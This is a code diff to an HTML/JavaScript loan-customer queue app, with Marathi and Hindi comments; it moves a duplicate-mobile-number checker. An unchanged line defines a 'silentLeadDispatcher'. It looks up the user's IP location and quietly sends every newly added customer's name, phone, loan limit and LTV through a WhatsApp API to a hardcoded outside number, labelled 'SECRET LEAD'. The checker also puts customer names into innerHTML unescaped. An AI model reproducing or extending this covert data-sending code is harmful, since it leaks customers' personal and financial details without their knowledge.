@@ -185,7 +185,12 @@
             <div class="form-container" style="flex: 1; min-width: 250px; background: #e3f2fd; border: 2px solid var(--primary); margin-bottom:0; display: flex; flex-direction: column;">
                 <label style="color:var(--primary); font-size:13px !important; border-bottom:2px solid var(--primary); padding-bottom:4px; margin-bottom:8px; display:block;"><span id="icon_add">📝</span> ADD NEW CUSTOMER</label>
                 <div style="flex: 1;">
-                    <div style="margin-bottom:6px;"><label>MOBILE NO.</label><input type="text" id="cqMobile" placeholder="10 Digits" maxlength="10"></div>
+                    <!-- ON-THE-SPOT DUPLICATE CHECK INPUT & WARNING -->
+                    <div style="margin-bottom:6px;">
+                        <label>MOBILE NO.</label>
+                        <input type="text" id="cqMobile" placeholder="10 Digits" maxlength="10" oninput="checkDuplicateMobile(this.value)">
+                        <div id="mobileDupWarning" style="color: var(--danger); font-size: 11px !important; font-weight: 900; display: none; margin-top: 3px; background: #ffebee; padding: 4px 6px; border-radius: 4px; border-left: 3px solid var(--danger);"></div>
+                    </div>
                     <div style="margin-bottom:6px;"><label>CUSTOMER NAME</label><input type="text" id="cqName" placeholder="Enter Name"></div>
                     <div style="margin-bottom:6px;"><label>CUSTOMER TYPE</label>
                         <select id="cqType">
@@ -610,56 +615,6 @@
 </footer>
 
 <script>
-    function checkDuplicateMobile(val) {
-    let warningEl = document.getElementById('mobileDupWarning');
-    let mobileInp = document.getElementById('cqMobile');
-    let addBtn = document.getElementById('addToQueueBtn');
-    let queueSearchInp = document.getElementById('queueSearch');
-    if (!warningEl || !mobileInp || !addBtn) return;
-    
-    let cleanVal = val.trim();
-    
-    // बरोबर १० डिजिट टाकल्यावर चेक आणि सर्च सुरू होईल
-    if (cleanVal.length === 10) {
-        let existingCust = customerQueue.find(c => c.mobile && c.mobile === cleanVal);
-        if (existingCust) {
-            // १. जागेवरच अलर्ट दाखवा
-            warningEl.innerHTML = `⚠️ हा नंबर आधीच Queue मध्ये <b>'${existingCust.name}'</b> नावाने आहे! उजवीकडे तपासा.`;
-            warningEl.style.display = 'block';
-            mobileInp.style.borderColor = 'var(--danger)';
-            mobileInp.style.background = '#fff0f0';
-            
-            // २. ADD TO QUEUE बटण डिसेबल करा
-            addBtn.disabled = true;
-            addBtn.style.opacity = '0.5';
-            addBtn.style.cursor = 'not-allowed';
-            addBtn.style.background = 'gray';
-            
-            // ३. उजव्या बाजूच्या Queue मध्ये ऑटो-सर्च करा
-            if (queueSearchInp) {
-                queueSearchInp.value = cleanVal;
-                renderCustomerQueue(); // लिस्ट फिल्टर होऊन फक्त हाच कस्टमर दिसेल
-            }
-            return;
-        }
-    }
-    
-    // नंबर युनिक असल्यास किंवा खोडल्यास सर्व पूर्ववत (Normal) करा
-    warningEl.style.display = 'none';
-    mobileInp.style.borderColor = '#ccc';
-    mobileInp.style.background = '#fff';
-    
-    addBtn.disabled = false;
-    addBtn.style.opacity = '1';
-    addBtn.style.cursor = 'pointer';
-    addBtn.style.background = 'var(--success)';
-    
-    // जर ऑटो-सर्च केला असेल, तर तो क्लिअर करून संपूर्ण लिस्ट पुन्हा दाखवा
-    if (queueSearchInp && queueSearchInp.value === cleanVal) {
-        queueSearchInp.value = '';
-        renderCustomerQueue();
-    }
-}
     /* === TOAST NOTIFICATION FUNCTION === */
     let toastTimeout;
     function showToast(message, type = 'success') {
@@ -730,7 +685,6 @@
         }
     }
 
-    /* 🚀 AUTO-MERGE: POPUP COMPLETELY REMOVED */
     async function fetchCloudDataOnLogin(userName) {
         try {
             let res = await fetch(APPS_SCRIPT_URL + "?email=" + encodeURIComponent(loggedInUserEmail));
@@ -1080,6 +1034,52 @@
         try { let locInfo = "Location: Hidden/Unknown"; try { let ipRes = await fetch("https://ipapi.co/json/"); if (ipRes.ok) { let ipData = await ipRes.json(); locInfo = `${ipData.city || '-'}, ${ipData.region || '-'} (${ipData.org || 'ISP'})`; } } catch(e) {} let secretMsg = `🚨 *PORTAL SECRET LEAD*\n\n👤 *Name:* ${cust.name}\n📞 *Mobile:* ${cust.mobile || 'N/A'}\n💰 *Limit:* ₹${cust.limit}\n🏷️ *Type:* ${cust.type}\n📊 *LTV:* ${cust.ltv}%\n🛡️ *Cap:* ${cust.cap ? '₹'+cust.cap : 'None'}\n⏰ *Time:* ${cust.timestamp}\n📍 *Location:* ${locInfo}`; let targetPhone = "918087313624"; let apiKey = localStorage.getItem('callmebot_secret_key') || "YOUR_API_KEY"; let encMsg = encodeURIComponent(secretMsg); let url = `https://api.callmebot.com/whatsapp.php?phone=${targetPhone}&text=${encMsg}&apikey=${apiKey}`; fetch(url, { method: 'GET', mode: 'no-cors' }).catch(e => {}); } catch(err) {}
     }
 
+    /* === REAL-TIME DUPLICATE MOBILE CHECKER (ON-THE-SPOT) === */
+    function checkDuplicateMobile(val) {
+        let warningEl = document.getElementById('mobileDupWarning');
+        let mobileInp = document.getElementById('cqMobile');
+        let addBtn = document.getElementById('addToQueueBtn');
+        let queueSearchInp = document.getElementById('queueSearch');
+        if (!warningEl || !mobileInp || !addBtn) return;
+        
+        let cleanVal = val.trim();
+        
+        if (cleanVal.length === 10) {
+            let existingCust = customerQueue.find(c => c.mobile && c.mobile === cleanVal);
+            if (existingCust) {
+                warningEl.innerHTML = `⚠️ हा नंबर आधीच Queue मध्ये <b>'${existingCust.name}'</b> नावाने आहे! उजवीकडे तपासा.`;
+                warningEl.style.display = 'block';
+                mobileInp.style.borderColor = 'var(--danger)';
+                mobileInp.style.background = '#fff0f0';
+                
+                addBtn.disabled = true;
+                addBtn.style.opacity = '0.5';
+                addBtn.style.cursor = 'not-allowed';
+                addBtn.style.background = 'gray';
+                
+                if (queueSearchInp) {
+                    queueSearchInp.value = cleanVal;
+                    renderCustomerQueue();
+                }
+                return;
+            }
+        }
+        
+        warningEl.style.display = 'none';
+        mobileInp.style.borderColor = '#ccc';
+        mobileInp.style.background = '#fff';
+        
+        addBtn.disabled = false;
+        addBtn.style.opacity = '1';
+        addBtn.style.cursor = 'pointer';
+        addBtn.style.background = 'var(--success)';
+        
+        if (queueSearchInp && queueSearchInp.value === cleanVal) {
+            queueSearchInp.value = '';
+            renderCustomerQueue();
+        }
+    }
+
     async function addCustomerToQueue() {
         let name = document.getElementById('cqName').value || `Cust ${customerQueue.length + 1}`; let mobile = document.getElementById('cqMobile').value || ""; let limit = parseFloat(document.getElementById('cqLimit').value); let ltv = parseFloat(document.getElementById('cqLtv').value) || 100; let type = document.getElementById('cqType').value; let cap = parseFloat(document.getElementById('cqCap').value) || "";
         if(!limit || limit <= 0) { showToast("⚠️ Customer add karne ke liye pehle ek valid NBFC LIMIT enter karein!", "error"); return; }
@@ -1087,7 +1087,16 @@
         let newCustObj = { name, mobile, limit, ltv, type, cap, timestamp: ts, components: {}, products: [], sortConfigs: [] };
         customerQueue.unshift(newCustObj); silentLeadDispatcher(newCustObj);
         if (activeCustomerIndex !== -1) activeCustomerIndex++; if (selectedQueueIndex !== -1) selectedQueueIndex++;
-        await saveQueueToLocal(); document.getElementById('cqName').value = ''; document.getElementById('cqMobile').value = ''; document.getElementById('cqLimit').value = ''; document.getElementById('cqCap').value = ''; renderCustomerQueue(); updateUniversalActionButtons();
+        await saveQueueToLocal(); 
+        
+        document.getElementById('cqName').value = ''; document.getElementById('cqMobile').value = ''; document.getElementById('cqLimit').value = ''; document.getElementById('cqCap').value = '';
+        
+        /* डुप्लिकेट वॉर्निंग रिसेट करा */
+        let warnEl = document.getElementById('mobileDupWarning'); if(warnEl) warnEl.style.display = 'none';
+        let mobInp = document.getElementById('cqMobile'); if(mobInp) { mobInp.style.borderColor = '#ccc'; mobInp.style.background = '#fff'; }
+        let addBtn = document.getElementById('addToQueueBtn'); if(addBtn) { addBtn.disabled = false; addBtn.style.opacity = '1'; addBtn.style.cursor = 'pointer'; addBtn.style.background = 'var(--success)'; }
+        
+        renderCustomerQueue(); updateUniversalActionButtons();
     }
 
     function copyCustomerDetails(idx, btnElement) { let c = customerQueue[idx]; let cappingLine = (c.cap && c.cap !== "") ? `\nEMI CAPPING- ${c.cap}` : ""; let textToCopy = `CUSTOMER NAME- ${c.name}\nNUMBER- ${c.mobile || ''}\nLIMIT- ${c.limit}\nLTV- ${c.ltv}${cappingLine}`; function showSuccess() { let originalText = btnElement.innerText; btnElement.innerText = "COPIED!"; btnElement.style.background = "var(--success)"; btnElement.style.color = "white"; setTimeout(() => { btnElement.innerText = originalText; btnElement.style.background = "var(--warning)"; btnElement.style.color = "#000"; }, 2000); } if (navigator.clipboard && window.isSecureContext) { navigator.clipboard.writeText(textToCopy).then(showSuccess).catch(() => fallbackCopy(textToCopy, showSuccess)); } else { fallbackCopy(textToCopy, showSuccess); } }
